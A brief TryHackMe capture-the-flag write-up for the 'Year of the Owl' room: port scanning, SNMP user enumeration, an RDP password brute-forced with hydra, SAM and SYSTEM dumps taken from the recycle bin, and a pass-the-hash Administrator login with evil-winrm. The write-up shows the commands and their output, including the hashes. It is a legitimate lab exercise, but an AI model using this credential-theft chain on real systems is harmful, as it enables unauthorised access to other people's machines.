## Year of the Owl Tryhackme Writeup

### Nmap
```
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
```
UDP port SNMP 161 open

snmp-check 10.10.233.57 -c openview

```
[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount 
```

With this username crack password using hydra

	[3389][rdp] host: 10.10.233.57   login: Jareth   password: login: Jareth password: sarah

## Privesc

```
*Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001


```

cd 'c:\$recycle.bin\<User SID>' Recyle bin has the sam and system bak files. 


```
┌──(arun㉿kali)-[/usr/share/creddump7]
└─$ python pwdump.py ~/CTF/THM/yearoftheowl/SYSTEM ~/CTF/THM/yearoftheowl/SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
```

### Pass the Hash

```
┌──(arun㉿kali)-[/usr/share/creddump7]
└─$ evil-winrm -i 10.10.233.57 -u administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

```
